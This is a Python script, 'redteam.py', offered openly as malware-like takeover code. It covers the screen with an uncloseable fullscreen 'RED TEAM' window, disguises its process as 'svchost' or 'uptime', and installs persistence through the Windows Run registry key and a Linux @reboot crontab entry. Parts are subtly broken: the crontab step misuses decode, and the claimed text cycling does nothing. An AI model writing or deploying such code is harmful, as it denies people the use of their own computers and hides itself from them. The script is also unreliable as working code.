#!/usr/bin/env python3
# redteam.py - Simple. Clean. Unstoppable.
# Fullscreen "RED TEAM" in giant red letters
# Hidden process name
# Persistence on Windows + Linux
# Remote delay control via ~/.rt_delay (milliseconds)
# Works forever. No escape.

import os
import sys
import time
import subprocess
import platform

try:
    import tkinter as tk
    from tkinter import font as tkfont
except:
    print("tkinter missing - install with: sudo apt install python3-tk  (Linux) or it's already on Windows")
    sys.exit(1)

SCRIPT     = os.path.abspath(__file__)
PID_FILE   = os.path.expanduser("~/.rt_pid")
DELAY_FILE = os.path.expanduser("~/.rt_delay")
DEFAULT_DELAY = 30000  # 30 seconds default

def get_delay():
    try:
        with open(DELAY_FILE) as f:
            return max(5000, int(f.read().strip()))
    except:
        return DEFAULT_DELAY

# Hidden process name
def hide_process():
    name = "svchost" if os.name == "nt" else "uptime"
    try:
        import ctypes
        if platform.system() == "Linux":
            ctypes.CDLL("libc.so.6").prctl(15, name.encode() + b"\0", 0, 0, 0)
        else:  # Windows
            ctypes.windll.kernel32.SetConsoleTitleW(name)
    except: pass

# Persistence
def install_persistence():
    if os.name == "nt":  # Windows
        try:
            import winreg as reg
            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
            pythonw = sys.executable.replace("python.exe", "pythonw.exe")
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            reg.SetValueEx(key, "WindowsServiceHost", 0, reg.REG_SZ, f'"{pythonw}" "{SCRIPT}"')
            reg.CloseKey(key)
        except: pass
    else:  # Linux
        line = f"@reboot python3 \"{SCRIPT}\"\n"
        try:
            cur = subprocess.check_output("crontab -l 2>/dev/null || true", shell=True).decode()
            if line not in cur.decode():
                subprocess.run("crontab -", shell=True, input=(cur.decode() + line).encode())
        except: pass

# Main GUI - giant "RED TEAM"
def redteam_takeover():
    hide_process()

    # Kill old instance
    if os.path.exists(PID_FILE):
        try:
            with open(PID_FILE) as f:
                os.kill(int(f.read().strip()), 9)
        except: pass

    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.attributes("-topmost", True)
    root.configure(bg="black")
    root.overrideredirect(True)  # no titlebar, no close button

    # Make text as big as possible
    screen_w = root.winfo_screenwidth()
    screen_h = root.winfo_screenheight()
    font_size = 1
    while True:
        try:
            font = tkfont.Font(family="Impact", size=font_size, weight="bold")
            if font.metrics("linespace") * 3 > screen_h:
                break
            font_size += 10
        except:
            break
    font_size -= 10

    label = tk.Label(root, text="RED TEAM", foreground="#ff0000", background="black",
                     font=("Impact", font_size, "bold"))
    label.pack(expand=True)

    # Save PID
    with open(PID_FILE, "w") as f:
        f.write(str(os.getpid()))

    # Change text every X seconds (remotely controllable)
    def cycle():
        root.after(get_delay(), cycle)

    root.after(get_delay(), cycle)
    root.mainloop()

# ———————— MAIN ————————
if __name__ == "__main__":
    hide_process()

    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        install_persistence()
        print("[+] Red Team persistence installed (Windows + Linux)")
        sys.exit(0)

    # On Windows: relaunch silently with pythonw.exe
    if os.name == "nt" and "pythonw.exe" not in sys.executable:
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw):
            os.execv(pythonw, [pythonw, SCRIPT])

    redteam_takeover()
